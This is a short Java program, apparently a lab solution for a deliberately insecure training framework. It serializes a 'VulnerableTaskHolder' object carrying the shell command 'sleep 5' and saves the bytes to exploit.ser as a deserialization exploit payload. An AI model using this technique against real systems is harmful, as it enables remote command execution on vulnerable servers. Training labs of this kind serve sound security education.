package org.dummy.insecure.framework;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.ObjectInputStream;
import java.io.Serializable;
import java.time.LocalDateTime;
import java.io.ByteArrayOutputStream;
import java.io.ObjectOutputStream;

public class Main {

	public static void main(String[] args) throws IOException {
		VulnerableTaskHolder go = new VulnerableTaskHolder("sleep", "sleep 5");

		ByteArrayOutputStream bos = new ByteArrayOutputStream();
		ObjectOutputStream oos = new ObjectOutputStream(bos);
		oos.writeObject(go);
		oos.flush();
		byte[] exploit = bos.toByteArray();
		// save exploit to file
		var file = new java.io.FileOutputStream("exploit.ser");
		file.write(exploit);
		file.close();
	}

}
